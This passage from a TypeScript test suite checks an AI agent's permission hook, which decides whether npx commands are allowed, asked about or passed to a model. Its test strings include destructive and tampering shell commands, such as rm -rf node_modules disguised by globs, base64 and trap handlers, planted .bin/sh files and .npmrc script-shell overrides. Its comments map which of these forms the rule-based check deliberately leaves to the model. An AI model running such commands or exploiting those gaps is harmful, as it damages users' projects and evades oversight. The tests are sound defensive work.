    write(path.join(linked, "node_modules", "typescript", "package.json"), PKG({ name: "typescript" }));
    write(path.join(linked, "node_modules", "typescript", "bin", "tsc"), STAND_IN, 0o755);
    write(path.join(linked, "node_modules", "typescript", "lib", "tsc.js"), "");
    write(path.join(linked, "node_modules", "other", "index.js"), "");
    fs.mkdirSync(path.join(linked, "node_modules", ".bin"), { recursive: true });
    fs.symlinkSync("../typescript/bin/tsc", path.join(linked, "node_modules", ".bin", "tsc"));
    fs.symlinkSync("node_modules", path.join(linked, "deps"));
  });
  // The third pass's forms (a command that stands before the npx and spells node_modules).
  npxCases(() => dir, "ask", [
    ["rm node_modules/.bin/tsc && npx tsc --noEmit", NPX_OTHER],
    ["rm -rf node_modules; npx tsc", NPX_OTHER],
    ["rm -rf node_modules/.bin && npx tsc", NPX_OTHER],
    ["mv node_modules nm && npx tsc", NPX_OTHER],
    ["rm -rf node_\"\"modules; npx tsc", NPX_OTHER],
    ["cd src && rm -rf ../node_modules && npx tsc", NPX_OTHER],
    ["cd node_modules && rm -rf .bin; cd ..; npx tsc", NPX_OTHER],
    ["for i in 1 2; do rm -rf node_modules; npx tsc; done", NPX_OTHER],
    ["npx tsc $(rm -rf node_modules)", NPX_OTHER],
    ["npx tsc `rm -rf node_modules`", NPX_OTHER],
  ]);
  // What runs before the npx without standing before it: a loop, a function called twice, a
  // pipeline's other part, a background job. (The variant check's real runs: the second round
  // of the loop asked the registry for a package named tsc.)
  npxCases(() => dir, "ask", [
    ["for i in 1 2; do npx tsc; rm -rf node_modules; done", NPX_OTHER],
    ["while true; do npx tsc; rm -rf node_modules; break; done", NPX_OTHER],
    ["until false; do npx tsc; rm -rf node_modules; done", NPX_OTHER],
    ["f() { npx tsc; rm -rf node_modules; }; f; f", NPX_OTHER],
    ["f() { npx tsc; }; rm -rf node_modules; f", NPX_OTHER],
    ["printf 'a\\nb\\n' | while read x; do npx tsc; rm -rf node_modules; done", NPX_OTHER],
    ["npx tsc | rm -rf node_modules", NPX_OTHER],
    ["npx tsc & rm -rf node_modules", NPX_OTHER],
    ["npx tsc; rm -rf node_modules", NPX_OTHER],
    ["for i in 1 2; do npx tsc; rm node_modules/.bin/tsc; done", NPX_OTHER],
  ]);
  // Fifth pass, from here to the end of this group: the maintainer decided on one plain rule in
  // place of the fourth pass's reading of the other commands (which expanded their words against
  // the tree, and knew readers, removers, `.npmrc` and `package.json`): the call asks when any
  // other part of it spells `node_modules`, and nothing else about the other commands is read.
  // Each form below is the fourth pass's, with what the rule gives.
  //
  // Braces are words once expanded: they spell the name.
  npxCases(() => dir, "ask", [
    ["rm -rf {node_modules,dist}; npx tsc", NPX_OTHER],
    ["rm -rf node_{modules,x}; npx tsc", NPX_OTHER],
    ["node tool.js \"$d\"/node_modules; npx tsc", NPX_OTHER],
    // An output redirect, a copy, a link, a nearer node_modules the call makes.
    ["printf 'x' > node_modules/.bin/tsc; npx tsc", NPX_OTHER],
    ["echo x > node_modules/.bin/sh; npx tsc", NPX_OTHER],
    ["cp evil.sh node_modules/.bin/sh; npx tsc", NPX_OTHER],
    ["ln -s /bin/true node_modules/.bin/node && npx tsc", NPX_OTHER],
    ["mkdir -p src/node_modules/.bin && cp evil.sh src/node_modules/.bin/tsc; cd src && npx tsc", NPX_OTHER],
  ]);
  // These ask as they did, by rules that are not the npx's.
  npxCases(() => dir, "ask", [
    ["rm -rf ./*; npx tsc", /^rm /],
    ["rm -rf *; npx tsc", /^rm /],
    ["mv * ../gone; npx tsc", /^mv writes outside/],
    ["cd src; rm -rf ../*; npx tsc", /^rm /],
    ["rm -rf \"$d\"/node_modules; npx tsc", /rm/],
    ["cp other.json ~/.npmrc; npx tsc", /\.npmrc/],
    ["rm -rf ./* && npx tsc", /^rm /],
    ["mv * ../gone && npx tsc", /^mv writes outside/],
  ]);
  // LEFT TO THE MODEL ON PURPOSE (fifth pass; each asked in the fourth): a spelling without the
  // letters. A glob the shell expands to the name, a second name for the directory, a directory
  // that holds it, a name known only at run time.
  npxCases(() => dir, "classify", [
    ["rm -rf node_mod*; npx tsc", NPX_HAS("tsc")],
    ["rm -rf ./n*; npx tsc", NPX_HAS("tsc")],
    ["rm -rf node_modul?s; npx tsc", NPX_HAS("tsc")],
    ["rm -rf [n]ode_modules; npx tsc", NPX_HAS("tsc")],
    ["env rm -rf node_mod*; npx tsc", NPX_HAS("tsc")],
    ["rm -rf ${PWD}/node_m*; npx tsc", NPX_HAS("tsc")],
    ["rm -rf \"$PWD\"/node_m*; npx tsc", NPX_HAS("tsc")],
    ["rm -rf */.bin; npx tsc", NPX_HAS("tsc")],
    ["rm -f node_mod*/.bin/*; npx tsc", NPX_HAS("tsc")],
    ["rm -f ./*/.bin/tsc && npx tsc", NPX_HAS("tsc")],
    ["unlink node_mod*/.bin/tsc; npx tsc", NPX_HAS("tsc")],
    ["find node_mod* -delete; npx tsc", NPX_HAS("tsc")],
    ["rm -rf node_module[[=s=]]; npx tsc", NPX_HAS("tsc")],
    ["chmod -R a-x *; npx tsc", NPX_HAS("tsc")],
    ["touch ./*; npx tsc", NPX_HAS("tsc")],
    ["chmod -R a-x .; npx tsc", NPX_HAS("tsc")],
    ["cd src && chmod -R a-x .. && npx tsc", NPX_HAS("tsc")],
    ["cd src; touch ../*; npx tsc", NPX_HAS("tsc")],
    ["find . -delete; npx tsc", NPX_HAS("tsc")],
    ["rsync -a --delete empty/ ./ && npx tsc", NPX_HAS("tsc")],
    ["node tool.js \"$d\"/.bin/tsc; npx tsc", NPX_OR_SCRIPT],
    ["node tool.js --out=\"$d\"/package.json; npx tsc", NPX_OR_SCRIPT],
  ]);
  // LEFT TO THE MODEL ON PURPOSE (fifth pass; each asked in the fourth): a change of what npm
  // reads. The reading of the npx itself still asks about what `.npmrc` and `package.json` hold
  // before the call.
  npxCases(() => dir, "classify", [
    ["printf 'script-shell=./evilsh\\n' > .npmrc && npx tsc", NPX_HAS("tsc")],
    ["printf 'script-shell=./evilsh\\n' >> ./.npmrc; npx tsc", NPX_HAS("tsc")],
    ["echo '{\"bin\":{\"tsc\":\"evil.js\"}}' > package.json; npx tsc", NPX_HAS("tsc")],
    ["cp other.json package.json && npx tsc", NPX_HAS("tsc")],
    ["sed -i 's/fixture/x/' package.json; npx tsc", NPX_HAS("tsc")],
    ["tee .npmrc < other.json; npx tsc", NPX_HAS("tsc")],
    ["cd src && echo 'script-shell=./evilsh' > ../.npmrc && npx tsc", NPX_HAS("tsc")],
    ["cd src && cp ../other.json package.json && npx tsc", NPX_HAS("tsc")],
    ["rm -f packag?.json; npx tsc", NPX_HAS("tsc")],
    ["npx tsc; echo x > .npmrc", NPX_HAS("tsc")],
    ["npx prettier --write package.json; npx tsc", /\(npx (tsc|prettier): the project has node_modules\/\.bin\//],
  ]);
  npxCases(() => linked, "ask", [
    // The tool's package directory, and a file in it: each spells the name.
    ["rm -rf node_modules/typescript && npx tsc", NPX_OTHER],
    ["rm node_modules/typescript/bin/tsc; npx tsc", NPX_OTHER],
    ["sed -i 's/a/b/' node_modules/typescript/lib/tsc.js; npx tsc", NPX_OTHER],
    ["rm -rf node_modules/type*; npx tsc", NPX_OTHER],
    // Fifth pass: the model in the fourth (a path in node_modules that is not the tool's, a reader).
    ["rm -rf node_modules/other && npx tsc", NPX_OTHER],
    ["cat node_modules/typescript/package.json; npx tsc --version", NPX_OTHER],
  ]);
  npxCases(() => linked, "classify", [
    ["npx tsc", NPX_HAS("tsc")],
    ["ls deps/.bin; npx tsc", NPX_HAS("tsc")],
    // LEFT TO THE MODEL ON PURPOSE (fifth pass; each asked in the fourth): the checked file under
    // another name of its directory.
    ["rm deps/.bin/tsc && npx tsc", NPX_HAS("tsc")],
    ["rm -rf deps/.bin; npx tsc", NPX_HAS("tsc")],
  ]);
  // Fifth pass: what the fourth pass sent to the model as "a plain reader" or "a path inside
  // node_modules that is none of the above" asks: each spells the name (`ls node_modules/.bin; npx
  // tsc` asks too, in the maintainer's words).
  npxCases(() => dir, "ask", [
    ["rm -rf node_modules/.cache && npx tsc", NPX_OTHER],
    ["rm -rf node_modules/.vite && npx vite build", NPX_OTHER],
    ["find node_modules/.cache -type f -delete; npx jest", NPX_OTHER],
    ["ls node_modules/.bin; npx tsc", NPX_OTHER],
    ["ls node_modules && npx tsc", NPX_OTHER],
    ["cat node_modules/typescript/package.json; npx tsc --version", NPX_OTHER],
    ["echo 'cleaning node_modules/.cache' && npx tsc", NPX_OTHER],
    ["echo node_modules; npx tsc", NPX_OTHER],
    ["test -d node_modules && npx tsc", NPX_OTHER],
    ["[ -x node_modules/.bin/tsc ] && npx tsc", NPX_OTHER],
    ["[[ -d node_modules ]] && npx tsc", NPX_OTHER],
    ["find . -name '*.ts' -not -path './node_modules/*' | head -3; npx tsc", NPX_OTHER],
    ["npx tsc && ls node_modules/.cache", NPX_OTHER],
    ["node_modules/.bin/eslint . ; npx tsc", NPX_OTHER],
    // Another npx of the call is another command.
    ["npx eslint node_modules && npx tsc", NPX_OTHER],
    ["npx --no-install eslint --fix node_modules/.bin/tsc; npx tsc", NPX_OTHER],
  ]);
  // The model, in the fourth pass and now: nothing but the npx's own words spells the name.
  npxCases(() => dir, "classify", [
    ["if [ -f package.json ]; then npx tsc; fi", NPX_HAS("tsc")],
    ["cat package.json; npx tsc", NPX_HAS("tsc")],
    ["grep -c typescript package.json; npx tsc", NPX_HAS("tsc")],
    ["head -5 package.json && npx tsc", NPX_HAS("tsc")],
    ["ls -la . && npx tsc", NPX_HAS("tsc")],
    ["ls; npx tsc", NPX_HAS("tsc")],
    ["pwd; npx tsc", NPX_HAS("tsc")],
    ["rm -rf dist && npx tsc --noEmit", NPX_HAS("tsc")],
    ["rm -rf dist build && npx tsc --noEmit && echo ok", NPX_HAS("tsc")],
    ["mkdir -p dist && npx tsc", NPX_HAS("tsc")],
    ["printf 'x' > notes.txt; npx tsc", NPX_HAS("tsc")],
    ["printf 'x' > jest.config.js && npx jest", NPX_HAS("jest")],
    ["cd packages/a && rm -rf dist && npx tsc", NPX_HAS("tsc")],
    // The npx's own words (the tool's business), and an output of its own.
    ["npx tsc node_modules/x/index.d.ts", NPX_HAS("tsc")],
    ["npx tsc -p .", NPX_HAS("tsc")],
    ["npx prettier --check package.json", NPX_HAS("prettier")],
    ["npx tsc --noEmit && npx eslint .", /\(npx (tsc|eslint): the project has node_modules\/\.bin\//],
    ["npx prettier --check . && npx eslint . && npx tsc --noEmit", /\(npx (tsc|eslint|prettier): the project has node_modules\/\.bin\//],
  ]);
  npxCases(() => dir, "classify", ["git add . && npx tsc --noEmit", "eslint . && npx tsc --noEmit", "prettier --write . && npx tsc --noEmit", "tsc -p . && npx jest", "git status . && npx tsc", "cp -r src . ; npx tsc"]);
  // Left with the model on purpose (fourth pass, and still): a command that takes the tool away
  // without naming it. The model is shown the whole call, and judging what a script does is its
  // part.
  npxCases(() => dir, "classify", ["npm run reset && npx tsc", "make reset && npx tsc", "./reset.sh && npx tsc", "bash reset.sh; npx tsc", "F=-fdx; git clean $F; npx tsc", "git stash -a && npx tsc", "git stash push --all; npx tsc", "git stash push -ua; npx tsc", "node tool.js \"$d\"; npx tsc", "node tool.js \"$d\"/src; npx tsc"]);
});

describe("r4 28, fourth pass (5): a command that names npx without running it is what it is without the word", () => {
  let dir = "";
  before(() => {
    dir = project("npx4-shown", { "package.json": PKG() }, TOOLS);
  });
  // `command -v npx` and `command -V npx` asked with "npx downloads and runs a package"; they
  // print where the shell would find it. Each ends as the same words about another program do.
  for (const [c, same] of [
    ["command -v npx", "command -v tsc"],
    ["command -V npx", "command -V tsc"],
    ["command -v npx >/dev/null 2>&1", "command -v tsc >/dev/null 2>&1"],
    ["command -v npx bunx pnpx", "command -v tsc make git"],
    ["type npx", "type tsc"],
    ["type -a npx", "type -a tsc"],
    ["which npx", "which tsc"],
    ["hash npx", "hash tsc"],
  ]) {
    test(`${JSON.stringify(c)} ends as ${JSON.stringify(same)} does, and does not ask`, async () => {
      const got = await outcomeIn(dir, c);
      const other = await outcomeIn(dir, same);
      assert.equal(got.kind, other.kind, `${got.kind}: ${got.reason}`);
      assert.notEqual(got.kind, "ask", got.reason);
      assert.doesNotMatch(got.reason, /downloads and runs a package/);
    });
  }
  npxCases(() => dir, "allow", ["command -v npx", "command -V npx", "type npx", "which npx", "command -v npx >/dev/null 2>&1"]);
  npxCases(() => dir, "classify", [
    ["hash npx", /unknown command hash/],
    ["command -v npx >/dev/null && npx tsc", NPX_HAS("tsc")],
    ["which npx && npx tsc --noEmit", NPX_HAS("tsc")],
    ["hash npx; npx tsc", NPX_HAS("tsc")],
    // None of them is a way to run it: `command` without -v or -V runs npx.
    ["command npx tsc", NPX_HAS("tsc")],
    ["command -p npx tsc", NPX_HAS("tsc")],
  ]);
  // The word named at run time by what one of them prints: a program the check cannot name is
  // the model's, as any is.
  npxCases(() => dir, "classify", [
    ["command -v npx | xargs -I{} {} cowsay", /\(xargs\)$/],
    ["$(command -v npx) cowsay", /unknown command/],
    ["\"$(which npx)\" tsc", /unknown command/],
  ]);
  npxCases(() => dir, "ask", [
    ["command npx cowsay", /^npx cowsay: the project has no node_modules\/\.bin\/cowsay/],
    ["command -p npx cowsay", /^npx cowsay: the project has no/],
    ["command -v npx && npx cowsay", /^npx cowsay: the project has no/],
    ["command -v npx; npx -y cowsay", /^npx -y: /],
    ["command npx -y cowsay", /^npx -y: /],
    ["command -- npx tsc", NPX_OLD_ASK],
    ["builtin command npx cowsay", /npx/],
    ["command command npx cowsay", /npx/],
    ["command -v; npx cowsay", /^npx cowsay: the project has no/],
    ["command -vp npx cowsay", /./],
    ["exec npx cowsay", /^npx cowsay: the project has no/],
    ["command -v bunx; bunx cowsay", /^bunx downloads and runs a package$/],
    ["command bunx cowsay", /^bunx downloads and runs a package$/],
  ]);
});

describe("r4 28, fourth pass (6): node and sh in a node_modules/.bin", () => {
  // A project that depends on the npm package `node`: .bin/node is that package's bin.
  const nodeProject = (name: string, pkg: object, link: string | undefined, installed: object | null = { name: "node", version: "22.0.0", bin: { node: "bin/node" } }) => {
    const dir = project(name, { "package.json": PKG(pkg) }, ["tsc"]);
    if (installed) write(path.join(dir, "node_modules", "node", "package.json"), JSON.stringify(installed));
    write(path.join(dir, "node_modules", "node", "bin", "node"), STAND_IN, 0o755);
    write(path.join(dir, "node_modules", "evil", "x.js"), STAND_IN, 0o755);
    if (link) fs.symlinkSync(link, path.join(dir, "node_modules", ".bin", "node"));
    return dir;
  };
  for (const key of ["dependencies", "devDependencies", "optionalDependencies"]) {
    test(`classify: .bin/node is the bin of the installed package node, which package.json lists under ${key}`, async () => {
      const dir = nodeProject(`npx4-node-${key}`, { [key]: { node: "22.0.0" } }, "../node/bin/node");
      for (const c of ["npx tsc --noEmit", "npx --no-install tsc", "CI=1 npx tsc"]) {
        const got = await outcomeIn(dir, c);
        assert.equal(got.kind, "classify", `${c}: ${got.reason}`);
        assert.match(got.reason, NPX_HAS("tsc"));
      }
    });
  }
  const SHADOW = /^npx tsc: npm puts \S+\/node_modules\/\.bin\/(node|sh) in front of the PATH it starts tsc with, where it runs in place of the real (node|sh)$/;
  test("ask: a .bin/node that package.json does not list", async () => {
    const got = await outcomeIn(nodeProject("npx4-node-unlisted", {}, "../node/bin/node"), "npx tsc");
    assert.equal(got.kind, "ask", got.reason);
    assert.match(got.reason, SHADOW);
  });
  test("ask: a .bin/node that leads to another package's file, though package.json lists node", async () => {
    const got = await outcomeIn(nodeProject("npx4-node-elsewhere", { dependencies: { node: "22.0.0" } }, "../evil/x.js"), "npx tsc");
    assert.equal(got.kind, "ask", got.reason);
    assert.match(got.reason, SHADOW);
  });
  test("ask: a .bin/node that is a file of its own, though package.json lists node", async () => {
    const dir = nodeProject("npx4-node-file", { dependencies: { node: "22.0.0" } }, undefined);
    write(path.join(dir, "node_modules", ".bin", "node"), STAND_IN, 0o755);
    const got = await outcomeIn(dir, "npx tsc");
    assert.equal(got.kind, "ask", got.reason);
    assert.match(got.reason, SHADOW);
  });
  test("ask: a .bin/node into node_modules/node whose package.json names another package, or is missing", async () => {
    for (const [name, installed] of [["other", { name: "evil", version: "1.0.0" }], ["none", null]] as [string, object | null][]) {
      const got = await outcomeIn(nodeProject(`npx4-node-${name}`, { dependencies: { node: "22.0.0" } }, "../node/bin/node", installed), "npx tsc");
      assert.equal(got.kind, "ask", `${name}: ${got.reason}`);
      assert.match(got.reason, SHADOW);
    }
  });
  test("ask: a .bin/node of a directory above the one whose package.json lists it", async () => {
    const dir = nodeProject("npx4-node-above", {}, "../node/bin/node");
    write(path.join(dir, "packages", "a", "package.json"), PKG({ name: "a", dependencies: { node: "22.0.0" } }));
    const got = await outcomeIn(dir, "cd packages/a && npx tsc");
    assert.equal(got.kind, "ask", got.reason);
    assert.match(got.reason, SHADOW);
  });
  test("ask: an executable .bin/sh, whatever package.json lists", async () => {
    const dir = project("npx4-sh", { "package.json": PKG({ dependencies: { sh: "1.0.0", node: "22.0.0" } }) }, ["tsc", "sh"]);
    write(path.join(dir, "node_modules", "sh", "package.json"), JSON.stringify({ name: "sh", version: "1.0.0" }));
    const got = await outcomeIn(dir, "npx tsc");
    assert.equal(got.kind, "ask", got.reason);
    assert.match(got.reason, SHADOW);
  });
  // What is not executable is not what the PATH search of npm's shell, or of env, starts.
  test("classify: a .bin/sh or .bin/node that is not executable, a directory, or a link that leads nowhere", async () => {
    const plain = project("npx4-sh-plain", { "package.json": PKG() }, ["tsc"]);
    write(path.join(plain, "node_modules", ".bin", "sh"), STAND_IN, 0o644);
    write(path.join(plain, "node_modules", ".bin", "node"), STAND_IN, 0o644);
    const dirs = project("npx4-sh-dir", { "package.json": PKG() }, ["tsc"]);
    fs.mkdirSync(path.join(dirs, "node_modules", ".bin", "sh"));
    fs.symlinkSync("../nowhere", path.join(dirs, "node_modules", ".bin", "node"));
    for (const dir of [plain, dirs]) {
      const got = await outcomeIn(dir, "npx tsc");
      assert.equal(got.kind, "classify", got.reason);
      assert.match(got.reason, NPX_HAS("tsc"));
    }
    // ... and once it is executable, it asks.
    exec(path.join(plain, "node_modules", ".bin", "sh"));
    const got = await outcomeIn(plain, "npx tsc");
    assert.equal(got.kind, "ask", got.reason);
    assert.match(got.reason, SHADOW);
  });
});

// ---- fifth pass: one plain rule for the other commands of an npx call ----
//
// The fourth pass read every other command of the call (whether it is a plain reader, what its
// words expand to against the tree, whether they name `.bin`, the tool's file, a directory that
// holds node_modules, an `.npmrc` or a `package.json`). Two checks found forms it missed and 54
// everyday calls it newly asked about, and the maintainer decided:
//
//   "The call asks when any other part of it spells `node_modules`, in a command or inside a
//    string. Nothing else about the other commands is read; the rest goes to the model, which
//    sees the whole call. `ls node_modules/.bin; npx tsc` asks too. Removals that do not spell
//    the name (`git clean -fdx; npx tsc`) are the model's to judge."
//
// The tables stand here, above the sweep of the fourth pass (7), which takes them in; the tests
// of this pass are at the end of the file.
const D5_RM = "rm -rf node_modules";
// The letters in a word that holds shell text or any other text: the variant check's F1 (31
// forms; each asked before the fourth pass, went to the model in it, and the real npx then had
// no tool), and the three here-documents it found the model on both trees.
const D5_STRINGS: string[] = [
  `echo '${D5_RM}' | sh; npx tsc`, `echo '${D5_RM}' | bash; npx tsc`, `printf '${D5_RM}\\n' | sh; npx tsc`, `bash <<< '${D5_RM}'; npx tsc`, `sh <<< '${D5_RM}' && npx tsc`,
  `echo '${D5_RM}' > r.sh; sh r.sh; npx tsc`, `echo '${D5_RM}' > r.sh && bash r.sh && npx tsc`, `printf '${D5_RM}' > r.sh; . ./r.sh; npx tsc`, `source <(echo '${D5_RM}'); npx tsc`, `. <(echo '${D5_RM}'); npx tsc`, `bash <(echo '${D5_RM}'); npx tsc`,
  `watch -n1 '${D5_RM}'; npx tsc`, `flock /tmp/l -c '${D5_RM}'; npx tsc`, `script -qc '${D5_RM}' /dev/null; npx tsc`, `parallel '${D5_RM}' ::: x; npx tsc`,
  `trap '${D5_RM}' DEBUG; npx tsc`, `trap '${D5_RM}' ERR; false; npx tsc`, `trap '${D5_RM}' RETURN; f() { :; }; f; npx tsc`, `trap '${D5_RM}' EXIT; npx tsc`, `trap '${D5_RM}' USR1; npx tsc`, `trap "${D5_RM}" DEBUG; npx tsc`,
  `x='${D5_RM}'; $x; npx tsc`, `x='${D5_RM}'; echo "$x" | sh; npx tsc`, `at now <<< '${D5_RM}'; npx tsc`, `npm pkg set scripts.x='${D5_RM}'; npm run x; npx tsc`,
  `python3 -c "import shutil; shutil.rmtree('node_modules')"; npx tsc`, `node -e "require('fs').rmSync('node_modules',{recursive:true})"; npx tsc`, `perl -e 'system("${D5_RM}")'; npx tsc`, `ruby -e 'system("${D5_RM}")'; npx tsc`, `awk 'BEGIN{system("${D5_RM}")}'; npx tsc`,
  `python3 -c "import os; os.system('${D5_RM}')"; npx tsc`,
  // A here-document's body.
  `cat <<EOF | sh\n${D5_RM}\nEOF\nnpx tsc`, `sh <<EOF\n${D5_RM}\nEOF\nnpx tsc`, `bash <<'EOF'\n${D5_RM}\nEOF\nnpx tsc`, "cat <<EOF > notes.txt\nnode_modules\nEOF\nnpx tsc",
];
// The letters anywhere else outside the npx's own arguments: another command before or after it,
// at any depth; a redirect target, the npx's own too; the words in front of npx in its own
// command; a loop's or a case's header; a substitution among the npx's own arguments; the name
// spelled with quotes or a backslash in it; another npx of the call.
const D5_ELSEWHERE: string[] = [
  "rm -rf node_modules; npx tsc", "ls node_modules/.bin; npx tsc", "ls node_modules && npx tsc", "rm -rf node_modules/.cache && npx tsc", "rm -rf node_modules/.vite && npx vite build", "cat node_modules/typescript/package.json; npx tsc --version",
  "du -sh node_modules; npx tsc", "test -d node_modules && npx tsc", "[[ -d node_modules ]] && npx tsc", "echo 'cleaning node_modules/.cache' && npx tsc", "grep -rn foo --exclude-dir=node_modules . ; npx tsc", "tar czf ../a.tgz --exclude=node_modules . && npx tsc",
  "find . -name '*.ts' -not -path './node_modules/*' | head -3; npx tsc", "timeout 5 node_modules/.bin/tsc; npx tsc", "node_modules/.bin/eslint . ; npx tsc",
  "npx tsc; rm -rf node_modules", "npx tsc && ls node_modules/.cache", "npx tsc | grep -v node_modules", "npx tsc --noEmit 2>&1 | grep -v node_modules", "npx tsc & rm -rf node_modules",
  "for i in 1 2; do npx tsc; rm -rf node_modules; done", "f() { rm -rf node_modules; }; npx tsc; f", "f() { npx tsc; }; rm -rf node_modules; f", "if true; then rm -rf node_modules; fi; npx tsc", "bash -c 'rm -rf node_modules; npx tsc'", "(rm -rf node_modules); npx tsc",
  "npx tsc > node_modules/.bin/tsc", "npx tsc 2> node_modules/.cache/log", "npx tsc < node_modules/x", "npx tsc <<< node_modules", "echo x > node_modules/.bin/sh; npx tsc",
  "FOO=node_modules npx tsc", "for d in node_modules; do npx tsc; done", "for d in src node_modules; do echo $d; done; npx tsc", "case node_modules in *) npx tsc;; esac", "case $x in node_modules) npx tsc;; esac",
  "npx tsc $(ls node_modules)", "npx tsc `ls node_modules`", "npx tsc $(rm -rf node_modules)",
  "rm -rf node_mod''ules; npx tsc", "rm -rf \"node_mod\"ules; npx tsc", "rm -rf node_mod\\ules; npx tsc", "rm -rf 'node_modules'; npx tsc", "rm -rf {node_modules,dist}; npx tsc", "d=node_modules; rm -rf \"$d\"; npx tsc",
  // Another npx is another command; and so is the shell an npx stands in (the rule as stated).
  "npx rimraf node_modules && npx tsc", "npx eslint . --ignore-pattern node_modules && npx tsc", "npx tsc && npx eslint . --ignore-pattern node_modules", "bash -c 'npx eslint . --ignore-pattern node_modules'",
];
// These spell it too, and ask for a reason of their own (a rule that stands before the npx's).
const D5_OTHERWISE: string[] = ["PATH=node_modules/.bin:$PATH npx tsc", "NODE_PATH=node_modules npx tsc", "rm -rf node_modules && npm ci && npx tsc", "rm -rf $'node_modules'; npx tsc"];
const D5_ASKS: string[] = [...D5_STRINGS, ...D5_ELSEWHERE, ...D5_OTHERWISE];
// The 54 calls the fourth pass newly asked about (the variant check's "new asks", each the model
// before it): another command that names package.json or .npmrc, hands a glob or `.` to a program,
// or deletes by name under `.`. None spells node_modules: the model.
const D5_NEW_ASKS: string[] = [
  "jq . package.json && npx tsc", "jq .version package.json && npx tsc", "jq -r .name package.json && npx tsc", "sed -n 1,5p package.json && npx tsc", "awk 'NR<3' package.json && npx tsc", "less package.json && npx tsc",
  "bat package.json && npx tsc", "file package.json && npx tsc", "md5sum package.json && npx tsc", "sha256sum package-lock.json package.json && npx tsc", "sort package.json && npx tsc", "uniq package.json && npx tsc",
  "xxd package.json && npx tsc", "od package.json && npx tsc", "strings package.json && npx tsc", "git add package.json && npx tsc", "git add package.json package-lock.json && npx tsc", "git diff package.json && npx tsc",
  "git diff HEAD -- package.json && npx tsc", "git log -p package.json && npx tsc", "git log --oneline -- package.json && npx tsc", "git blame package.json && npx tsc", "git status package.json && npx tsc",
  "git ls-files package.json && npx tsc", "git commit -m x package.json && npx tsc", "git add -f package.json && npx tsc", "prettier --check package.json && npx tsc", "eslint package.json && npx tsc",
  "cp package.json package.json.bak && npx tsc", "cp package.json /tmp/p.json && npx tsc", "rsync -a package.json /tmp/ && npx tsc", "tar czf ../a.tgz package.json && npx tsc",
  "zip -r ../a.zip src package.json && npx tsc", "find . -type f -name '*.log' -delete && npx tsc", "find . -name '.DS_Store' -delete && npx tsc", "find . -name '*.orig' -delete && npx tsc",
  "find . -empty -type d -delete && npx tsc", "find . -name '*.ts' -exec wc -l {} + && npx tsc", "find . -name '*.ts' -exec chmod 644 {} + && npx tsc", "chmod -R u+w . && npx tsc", "chmod -R g+r . && npx tsc",
  "chmod 644 package.json && npx tsc", "chmod 755 . && npx tsc", "chown -R $USER . && npx tsc", "touch package.json && npx tsc", "touch .npmrc && npx tsc", "touch -c package.json && npx tsc", "code package.json && npx tsc",
  "open package.json && npx tsc", "git add * && npx tsc", "git add ./* && npx tsc", "prettier --check '*' && npx tsc", "eslint './*' && npx tsc",
];
// The everyday forms of this pass's brief, and the npx's own arguments (the words after the
// tool's name are the tool's business: they may spell it).
const D5_EVERYDAY: string[] = [
  "npx tsc --noEmit", "npx eslint .", "npx jest", "CI=true npx jest", "timeout 120 npx jest", "cd packages/a && npx tsc", "rm -rf dist && npx tsc --noEmit", "git add package.json && npx tsc", "git diff package.json && npx tsc --noEmit",
  "npx eslint . --ignore-pattern node_modules", "npx tsc && npx eslint .", "jq . package.json; npx tsc", "git add . && npx tsc", "find . -name '*.log' -delete && npx tsc", "chmod -R u+w . && npx tsc",
  "npx eslint . --ignore-pattern 'node_modules/**'", "npx eslint . --ignore-pattern \"node_modules\"", "npx tsc node_modules/x/index.d.ts", "npx jest --testPathIgnorePatterns node_modules", "timeout 120 npx jest --testPathIgnorePatterns=node_modules",
  "CI=1 npx --no-install eslint --ignore-pattern node_modules .", "cd packages/a && npx eslint . --ignore-pattern node_modules", "npx eslint . --ignore-pattern node_modules > lint.txt", "npx eslint . --ignore-pattern node_modules | head",
  "npx eslint . --ignore-pattern node_modules; echo done", "npx tsc --noEmit {a,b}node_modules", "d=src; npx eslint . --ignore-pattern node_modules \"$d\"",
];
// LEFT TO THE MODEL ON PURPOSE (the maintainer's decision; "nothing else about the other commands
// is read"). The model is shown the whole call, and these are its to judge:
const D5_ON_PURPOSE: string[] = [
  // a spelling without the letters (a glob, a name put together or decoded at run time);
  "rm -rf node_mod*; npx tsc", "rm -rf ./n*; npx tsc", "trap 'rm -rf node_mod*' DEBUG; npx tsc", "echo cm0gLXJmIG5vZGVfbW9kdWxlcw== | base64 -d | sh; npx tsc", "printf 'rm -rf node_\\155odules' | sh; npx tsc",
  // a command that removes or swaps the tool without naming it;
  "F=-fdx; git clean $F; npx tsc", "git stash -a && npx tsc", "git checkout other && npx tsc", "git switch other && npx tsc", "npm uninstall dep && npx tsc", "npm prune && npx tsc", "npm run reset && npx tsc", "make reset && npx tsc", "./reset.sh && npx tsc",
  "bash reset.sh; npx tsc", "sh < reset.sh; npx tsc", "tar --remove-files -cf ../a.tar . && npx tsc", "cp -r ../tpl/. . && npx tsc", "cp -rT tpl . && npx tsc", "npx rimraf . && npx tsc", "find . -delete; npx tsc", "chmod -R a-x .; npx tsc",
  // a change of what npm reads.
  "npm set script-shell=./x && npx tsc", "npm pkg set bin.tsc=./x.js && npx tsc", "echo x >> .npmrc; npx tsc", "cp other.json package.json && npx tsc", "sed -i 's/fixture/x/' package.json; npx tsc",
];
// One of the 54 runs a script with an interpreter: since group B's seventh pass such a call is
// the model's for the script's sake first (a script that is not there, or changed since the
// session began), with that reason. The ending is the same: the model, not an ask by the npx rule.
const D5_SCRIPT: string[] = ["node scripts/x.js package.json && npx tsc"];
const D5_MODEL: string[] = [...D5_NEW_ASKS, ...D5_SCRIPT, ...D5_EVERYDAY, ...D5_ON_PURPOSE];

describe("r4 28, fourth pass (7): every form is exactly an ask or exactly the model", () => {
  let dir = "";
  let bare = "";
  before(() => {
    dir = project("npx4-sweep", { "package.json": PKG({ devDependencies: { typescript: "5.9.3" } }), "src/a.ts": "export const a = 1;\n", "packages/a/package.json": PKG({ name: "a" }), "bin/npx": "#!/bin/sh\necho EVIL\n", "package-lock.json": "{}\n", Makefile: "reset:\n\trm -rf node_modules\n", "reset.sh": "#!/bin/sh\nrm -rf node_modules\n", "other.json": "{}\n" }, [...TOOLS, "vite", "mocha", "playwright", "ts-node", "next", "webpack", "rollup", "tsx", "biome", "astro", "rimraf"]);
    exec(path.join(dir, "bin", "npx"));
    // (Fifth pass: what its tables name.)
    exec(path.join(dir, "reset.sh"));
    bare = project("npx4-sweep-bare", { "package.json": PKG(), "src/a.ts": "" }, []);
  });
  // The everyday forms, the tool installed: the model (forty of them, with the brief's own).
  const EVERYDAY: string[] = [
